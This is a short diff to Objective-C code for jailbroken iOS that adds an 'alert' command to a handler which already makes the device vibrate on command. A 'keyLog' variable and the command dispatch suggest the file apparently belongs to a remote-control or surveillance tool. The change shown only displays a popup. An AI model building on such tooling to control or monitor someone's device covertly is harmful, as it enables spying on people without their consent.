@@ -1,5 +1,6 @@
 #import <AppSupport/CPDistributedMessagingCenter.h>
 #import <AudioToolbox/AudioServices.h>
+#import <UIKit/UIAlertView>
 
 #import "ac1d.h"
 
@@ -47,6 +48,10 @@ NSString *keyLog;
         void *handle = dlopen(0, 9);
         *(void**)(&vibrate) = dlsym(handle,"AudioServicesPlaySystemSoundWithVibration");
         vibrate(kSystemSoundID_Vibrate, nil, vDict);
+    } else if ([command isEqual:@"alert"]) {
+    	UIAlertView *alert = [[UIAlertView alloc] initWithTitle:title message:message delegate:nil cancelButtonTitle:@"ok" otherButtonTitles:nil];
+	[alert show];
+	[alert release];
     }
 }
 
